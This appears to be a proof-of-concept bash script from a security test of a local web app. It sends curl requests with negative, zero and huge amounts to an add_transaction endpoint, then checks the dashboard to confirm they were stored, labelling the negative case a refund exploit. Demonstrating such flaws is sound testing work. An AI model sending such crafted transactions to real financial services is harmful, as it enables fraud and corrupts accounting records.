#!/bin/bash

# POC: Business Logic Flaw - Invalid Transaction Amounts Accepted
# This script demonstrates that the add_transaction endpoint accepts invalid amounts:
# - Negative values (should be rejected)
# - Zero values (should be rejected)
# - Extremely large values (should be rejected or limited)

TARGET_URL="http://localhost:5003/add_transaction"
DASHBOARD_URL="http://localhost:5003/dashboard"

echo "=========================================="
echo "POC: Invalid Transaction Amount Validation"
echo "=========================================="
echo ""

# Test 1: Negative amount
echo "[TEST 1] Creating transaction with NEGATIVE amount (-100.0)"
echo "Command: curl -X POST $TARGET_URL -d 'name=TestNegative&email=test@test.com&amount=-100'"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" -d "name=TestNegative&email=test@test.com&amount=-100")
echo "Response: $RESPONSE1"
echo ""

# Test 2: Zero amount
echo "[TEST 2] Creating transaction with ZERO amount (0.0)"
echo "Command: curl -X POST $TARGET_URL -d 'name=TestZero&email=test@test.com&amount=0'"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" -d "name=TestZero&email=test@test.com&amount=0")
echo "Response: $RESPONSE2"
echo ""

# Test 3: Extremely large amount
echo "[TEST 3] Creating transaction with EXTREMELY LARGE amount (999999999999.99)"
echo "Command: curl -X POST $TARGET_URL -d 'name=TestLarge&email=test@test.com&amount=999999999999.99'"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" -d "name=TestLarge&email=test@test.com&amount=999999999999.99")
echo "Response: $RESPONSE3"
echo ""

# Verify transactions were stored by checking dashboard
echo "[VERIFICATION] Checking stored transactions on dashboard"
echo "Retrieving dashboard to confirm invalid transactions are present..."
DASHBOARD=$(curl -s "$DASHBOARD_URL")

# Check if our invalid transactions appear in the dashboard
if echo "$DASHBOARD" | grep -q "TestNegative\|TestZero\|TestLarge"; then
    echo "✓ VULNERABILITY CONFIRMED: Invalid transactions were stored and appear in dashboard"
    echo ""
    
    # Extract transaction details if available
    if echo "$DASHBOARD" | grep -q "\-100"; then
        echo "✓ Negative amount transaction (-100) found in dashboard"
    fi
    if echo "$DASHBOARD" | grep -q "TestZero"; then
        echo "✓ Zero amount transaction found in dashboard"
    fi
    if echo "$DASHBOARD" | grep -q "TestLarge\|999999999"; then
        echo "✓ Extremely large amount transaction found in dashboard"
    fi
else
    # Even if transactions aren't visible in HTML, check if they were created
    # by attempting to retrieve them or checking response codes
    if echo "$RESPONSE1$RESPONSE2$RESPONSE3" | grep -qi "success\|created\|redirect"; then
        echo "✓ VULNERABILITY CONFIRMED: Invalid transactions were accepted by the server"
        echo "  (Responses indicate successful creation despite invalid amounts)"
    else
        echo "⚠ Unable to fully verify - checking response codes..."
        # Try accessing dashboard with JSON content type to see transaction data
        DASHBOARD_JSON=$(curl -s -H "Accept: application/json" "$DASHBOARD_URL" 2>/dev/null)
        echo "$DASHBOARD_JSON"
    fi
fi

echo ""
echo "=========================================="
echo "POC Results Summary:"
echo "=========================================="
echo "The add_transaction endpoint accepts:"
echo "  1. Negative amounts (refund exploit)"
echo "  2. Zero amounts (accounting confusion)"
echo "  3. Extremely large amounts (overflow/calculation manipulation)"
echo ""
echo "No input validation is performed on the amount parameter."
echo "Business logic integrity is compromised."
echo "=========================================="